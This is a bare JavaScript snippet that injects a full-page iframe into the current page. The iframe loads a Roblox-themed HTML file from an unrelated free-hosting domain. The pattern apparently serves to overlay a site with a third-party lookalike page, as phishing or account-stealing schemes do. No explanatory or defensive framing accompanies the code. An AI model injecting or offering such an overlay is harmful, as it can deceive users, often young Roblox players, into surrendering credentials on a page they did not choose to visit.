var Rbxl = document.createElement("iframe")
Rbxl.src = "http://super-diamond-community.great-site.net/roblox/app/files/roblox.html"
Rbxl.width = "100%"
Rbxl.height = "100%"
document.body.appendChild(Rbxl)